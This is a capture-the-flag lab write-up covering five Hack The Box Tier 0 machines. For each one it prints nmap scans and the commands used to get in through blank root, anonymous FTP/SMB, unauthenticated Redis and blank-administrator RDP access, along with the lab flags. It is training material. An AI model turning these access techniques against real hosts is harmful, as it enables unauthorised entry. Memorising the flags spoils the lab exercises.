# HTB: Starting Point — Tier 0

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=flat-square&labelColor=0d1117)
![Tier](https://img.shields.io/badge/Tier-0-lightgrey?style=flat-square&labelColor=0d1117)
![Status](https://img.shields.io/badge/Status-Complete-00e5a0?style=flat-square&labelColor=0d1117)

---

## Overview

All 5 Tier 0 Starting Point machines completed. These machines cover
fundamental service exploitation — each one teaches a single core concept
in isolation.

| Machine | Service | Concept | Flag |
|:---|:---|:---|:---:|
| Meow | Telnet | Blank root credentials | ✅ |
| Fawn | FTP | Anonymous login | ✅ |
| Dancing | SMB | Anonymous share access | ✅ |
| Redeemer | Redis | Unauthenticated database | ✅ |
| Explosion | RDP | Default credentials | ✅ |

---

## Meow 

Date: 2026-04-05
Time in Box: 5 minutes

**Service:** Telnet (Port 23)
**Concept:** Blank root credentials

### Enumeration
nmap -sV -sC -O 10.129.20.9

Nmap scan report for 10.129.20.9

Host is up (0.058s latency).

Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Device type: general purpose
Running: Linux 4.X|5.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Exploitation
telnet 10.129.20.9
Trying 10.129.20.9...
Connected to 10.129.20.9.
Escape character is '^]'.


Meow login: root
(root was  the answer to the previous question in  the lab) 

### Flag
root@Meow:~# ls

flag.txt  snap

root@Meow:~# cat flag.txt

[b40abdfe23665f766f9c61ecba8a4c19]


### Key Takeaway
Telnet is unencrypted and legacy. Root with no password
is a critical misconfiguration still found on real IoT
devices and embedded systems today.

---

## Fawn

**Service:** FTP (Port 21)
**Concept:** Anonymous login

Date: 2026-04-05
Time in Box: 5 minutes

### Enumeration
nmap -sV -sC -O 10.129.1.14

Nmap scan report for 10.129.1.14

Host is up (0.060s latency).
Not shown: 999 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.150

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit
|      Session timeout in seconds is 300

|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

Device type: general purpose
Running: Linux 4.X|5.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19

Network Distance: 2 hops
Service Info: OS: Unix


### Exploitation
ftp 10.129.1.14                                                                                                                           
Connected to 10.129.1.14.

220 (vsFTPd 3.0.3)
Name (10.129.1.14:kali): Anonymous
331 Please specify the password.

Password: 
230 Login successful.

Remote system type is UNIX.
Using binary mode to transfer files.

ftp> 
ftp> ls

229 Entering Extended Passive Mode (|||34732|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> get  flag.txt
local: flag.txt remote: flag.txt

229 Entering Extended Passive Mode (|||34470|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************************************************************************|    32        0.39 KiB/s    00:00 ETA

226 Transfer complete.
32 bytes received in 00:00 (0.20 KiB/s)
ftp> bye
221 Goodbye.


### Flag

cat flag.txt  
[035db21c881520061c53e0536e44f815]

### Key Takeaway
Always test anonymous:anonymous or anonymous:(blank)
on any exposed FTP service. Anonymous FTP is a common
misconfiguration on file servers and NAS devices.

---

## Dancing

**Service:** SMB (Port 445)
**Concept:** Anonymous share access

Date: 2026-04-05
Time in Box: 8 minutes

### Enumeration
nmap -sV -sC -O 10.129.1.12

Nmap scan report for 10.129.1.12
Host is up (0.055s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m57s
| smb2-time: 

|   date: 2026-04-06T07:30:02
|_  start_date: N/A
| smb2-security-mode: 

|   3.1.1: 
|_    Message signing enabled but not required


### Exploitation
smbclient -L 10.129.1.12            
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.1.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

(the -L flag was one of the answers to a previous question in the lab and root was  the password entered to gain initial access)

smbclient //10.129.1.12/WorkShares
Password for [WORKGROUP\kali]:


smb: \> 
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

                
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 04:08:24 2021
  ..                                  D        0  Mon Mar 29 04:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 06:00:37 2021

               
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \Amy.J\> cd ../
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021


smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021


smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)

smb: \James.P\> exit


### Flag

cat flag.txt
[5f61c10dffbc77a704d76016a22f1664]

### Key Takeaway
SMB shares should never allow anonymous/guest access.
Always enumerate shares with smbclient -L and -N flag
on any open port 445.

---

## Redeemer 

Date: 2026-04-07
Time in Box: 12 minutes

**Service:** Redis (Port 6379)
**Concept:** Unauthenticated database access

### Enumeration
nmap -sS -sV -Pn -p 1000-9999 -T5 10.129.21.145
Nmap scan report for 10.129.21.145

Host is up (0.018s latency).
Not shown: 8999 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

6379/tcp open  redis   Redis key-value store 5.0.7


### Exploitation
redis-cli -h 10.129.21.138 -p 6379
10.129.21.138:6379> keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"

### Flag
10.129.21.138:6379> mget flag
1) "03e1d2b376c37ab3f5319922053953eb"

### Key Takeaway
Redis, MongoDB, and other databases are frequently left
exposed with no authentication. Always check for open
database ports during enumeration.

---

## Explosion

**Service:** RDP (Port 3389)
**Concept:** Default credentials

### Enumeration
nmap -sC -sV 10.129.21.150                     

Nmap scan report for 10.129.21.150


PORT     STATE SERVICE          VERSION
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server      Microsoft Terminal Services


### Exploitation
xfreerdp /u:administrator /p: /v:10.129.21.150

 since the credentials are blank there is no need to put 
 anything in the /p: space.


### Flag
once you gain rdp access the flag is on the desktop

flag [951fa96d7830c451b536be5a6be008a0]

### Key Takeaway
Default and blank credentials on RDP are extremely
common on misconfigured Windows machines. Always test
Administrator with a blank password on exposed RDP.

---

## Overall Lessons Learned

- Every Tier 0 machine is a single concept — one open
  port, one misconfiguration, one flag
- These vulnerabilities exist in real production
  environments on legacy and IoT devices
- The enumeration habit starts here — always run nmap
  first before touching anything
- Document every command even on simple machines —
  the writeup habit is more important than the difficulty

---

*Written by [Uzoma Onwumere](https://github.com/YOURUSERNAME)
· [LinkedIn](https://www.linkedin.com/in/uzoma-onwumere-160966273)
· [HackTheBox](https://profile.hackthebox.com/profile/019d0e5e-c931-716a-a587-cc6458037e32)*
